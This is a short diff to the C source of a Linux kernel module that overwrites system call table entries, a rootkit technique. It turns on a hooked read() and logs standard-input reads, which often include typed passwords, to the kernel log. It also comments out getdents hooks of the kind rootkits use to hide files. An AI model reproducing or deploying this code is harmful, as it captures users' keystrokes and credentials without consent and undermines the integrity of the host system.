@@ -75,7 +75,9 @@ asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
     retval = original_read(fd, buf, count);
     cur_buf = buf;
     if (retval > 0){
-        printk(KERN_INFO "%d = hooked_read(%d, %s, %d)\n", retval, fd, buf, count);
+        if (fd == 0){
+            printk(KERN_INFO "%d = hooked_read(%d, %s, %d)\n", retval, fd, buf, count);
+        }
     }
     OUR_MODULE_PUT;
     return retval;
@@ -166,9 +168,9 @@ void hook_functions(void){
   make_page_writable((long unsigned int) ptr_sys_call_table);
 
   // replace function pointers! YEEEHOW!!
-  //sys_call_table[__NR_read] = (void*) hooked_read;
-  sys_call_table[__NR_getdents] = (void*) hooked_getdents;
-  sys_call_table[__NR_getdents64] = (void*) hooked_getdents64;
+  sys_call_table[__NR_read] = (void*) hooked_read;
+  // sys_call_table[__NR_getdents] = (void*) hooked_getdents;
+  // sys_call_table[__NR_getdents64] = (void*) hooked_getdents64;
 }
 
 /* Hooks the read system call. */
